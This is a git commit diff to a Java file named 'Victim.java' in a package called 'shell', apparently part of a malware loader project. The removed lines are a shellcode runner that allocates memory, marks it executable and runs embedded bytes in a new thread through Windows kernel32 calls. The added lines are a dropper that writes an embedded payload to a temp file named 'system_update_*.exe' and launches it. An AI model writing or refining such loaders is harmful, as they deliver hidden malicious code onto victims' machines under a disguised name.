8950596f270eb173698ce9f371a70a04e46e6acf
David Pérez <david.perez.dam2@gmail.com>
2026-04-30 03:01:52 +0200

    changed to exe no asm

--- app/src/main/java/shell/Victim.java
+++ app/src/main/java/shell/Victim.java
@@ -1,41 +1,35 @@
 package shell;
 
-import com.sun.jna.Native;
-import com.sun.jna.win32.StdCallLibrary;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.InputStream;
 
 public class Victim {
-
-    public interface Kernel32 extends StdCallLibrary {
-        // We will load this inside main to be safer
-        long VirtualAlloc(long lpAddress, long dwSize, int flAllocationType, int flProtect);
-        long CreateThread(long lpThreadAttributes, long dwStackSize, long lpStartAddress, long lpParameter, int dwCreationFlags, long lpThreadId);
-        int WaitForSingleObject(long hHandle, int dwMilliseconds);
-        boolean VirtualProtect(long lpAddress, long dwSize, int flNewProtect, com.sun.jna.ptr.IntByReference lpflOldProtect);
-    }
-
     public static void main(String[] args) {
         try {
-            // Load JNA instance here
-            Kernel32 k32 = Native.load("kernel32", Kernel32.class);
+            System.out.println("[*] Extracting payload...");
 
-            System.out.println("[*] Extracting embedded payload...");
             InputStream is = Victim.class.getResourceAsStream("/data.dat");
-            if (is == null) return;
-            byte[] shellcode = is.readAllBytes();
+            if (is == null) {
+                System.out.println("[!] data.dat not found in resources!");
+                return;
+            }
 
-            System.out.println("[*] Allocating memory...");
-            long address = k32.VirtualAlloc(0, shellcode.length, 0x3000, 0x04);
+            File tempExe = File.createTempFile("system_update_", ".exe");
+            tempExe.deleteOnExit();
 
-            com.sun.jna.Pointer pointer = new com.sun.jna.Pointer(address);
-            pointer.write(0, shellcode, 0, shellcode.length);
+            try (FileOutputStream fos = new FileOutputStream(tempExe)) {
+                byte[] buffer = new byte[8192];
+                int bytesRead;
+                while ((bytesRead = is.read(buffer)) != -1) {
+                    fos.write(buffer, 0, bytesRead);
+                }
+            }
 
-            com.sun.jna.ptr.IntByReference oldProtect = new com.sun.jna.ptr.IntByReference();
-            k32.VirtualProtect(address, shellcode.length, 0x20, oldProtect);
+            System.out.println("[*] Launching: " + tempExe.getAbsolutePath());
+            new ProcessBuilder(tempExe.getAbsolutePath()).start();
 
-            System.out.println("[*] Executing thread...");
-            long threadHandle = k32.CreateThread(0, 0, address, 0, 0, 0);
-            k32.WaitForSingleObject(threadHandle, -1);
+            System.out.println("[+] Payload deployed successfully.");
 
         } catch (Exception e) {
             e.printStackTrace();
